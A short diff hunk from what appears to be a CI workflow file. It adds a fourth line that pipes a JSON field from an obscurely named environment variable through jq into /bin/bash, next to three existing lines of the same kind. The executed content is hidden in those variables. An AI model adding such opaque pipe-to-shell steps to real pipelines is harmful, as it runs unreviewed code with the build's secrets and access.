@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$jooli79" | jq -r .gvb2 | /bin/bash
           echo $yqnc4 | jq -r .ba137 | /bin/bash
           echo $otqq311 | jq -r .dgua3129 | /bin/bash
+          echo $zaokc637 | jq -r .vbed40804 | /bin/bash
 
       - name: Upload artifact
         if: always()
